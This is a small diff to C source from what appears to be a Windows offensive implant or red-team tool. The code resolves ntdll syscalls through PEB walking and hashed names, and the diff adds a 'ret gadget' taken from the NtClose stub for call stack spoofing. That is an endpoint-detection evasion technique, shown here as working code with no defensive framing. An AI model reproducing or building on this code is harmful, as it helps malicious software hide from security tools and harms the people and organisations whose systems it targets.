@@ -9,6 +9,7 @@
 
 SYSCALL_TABLE g_ssn = {0};
 SYSCALL_ADDR_TABLE g_addr = {0};
+PVOID g_ret_gadget = NULL;
 
 /* ── PEB access ──────────────────────────────────────────── */
 
@@ -158,6 +159,11 @@ BOOL resolve_syscalls(void) {
     ok &= resolve_one(ntdll, H_NtFsControlFile, &g_ssn.NtFsControlFile, &g_addr.NtFsControlFile);
     ok &= resolve_one(ntdll, H_NtFlushBuffersFile, &g_ssn.NtFlushBuffersFile, &g_addr.NtFlushBuffersFile);
     ok &= resolve_one(ntdll, H_NtCreateNamedPipeFile, &g_ssn.NtCreateNamedPipeFile, &g_addr.NtCreateNamedPipeFile);
+
+    /* ret gadget for call stack spoofing: points to the C3 (ret) after
+       the 0F 05 (syscall) in any resolved Nt* stub — NtClose is always present */
+    if (g_addr.NtClose)
+        g_ret_gadget = (BYTE *)g_addr.NtClose + 2;
 
     return ok;
 }
